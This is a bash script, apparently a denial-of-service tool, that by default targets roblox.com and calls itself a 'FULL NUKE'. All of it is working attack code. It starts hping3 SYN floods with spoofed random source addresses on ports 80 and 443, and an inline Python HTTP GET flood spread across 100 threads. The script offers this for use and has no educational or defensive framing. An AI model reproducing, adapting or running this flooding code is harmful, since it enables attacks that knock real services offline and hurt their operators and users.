#!/bin/bash

# ========== CONFIG ==========
DOMAIN="roblox.com"   # CHANGE THIS
# ============================

echo "[💀] FULL NUKE ON $DOMAIN"

# SYN floods
sudo hping3 -S -p 80  --flood --rand-source "$DOMAIN" &
sudo hping3 -S -p 443 --flood --rand-source "$DOMAIN" &

# HTTP flood (Python inline)
python3 -c "
import socket,threading,random,time
D='$DOMAIN'
def f():
 while 1:
  try:
   s=socket.socket(); s.settimeout(1); s.connect((D,80))
   s.send(f'GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {D}\r\n\r\n'.encode()); s.close()
  except: pass
for _ in range(100): threading.Thread(target=f,daemon=True).start()
time.sleep(99999)
" &

echo "[+] All attacks running. Press Ctrl+C to stop."
wait
